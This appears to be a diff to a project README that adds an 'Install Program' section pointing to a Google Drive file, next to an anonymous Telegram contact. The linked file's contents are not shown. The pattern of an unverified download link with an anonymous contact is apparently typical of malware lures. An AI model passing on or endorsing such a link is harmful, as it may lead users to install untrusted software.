@@ -22,6 +22,8 @@ Requirements:
 .NET 9.0 (https://dotnet.microsoft.com/en-us/download)
 
 
+Install Program:
+Link https://drive.google.com/file/d/1cmk-wYWvalcSYZOXvF6Xai_KoKAupgkZ/view?usp=sharing
 
 Telegram : https://t.me/trAvis_Anonymous
 
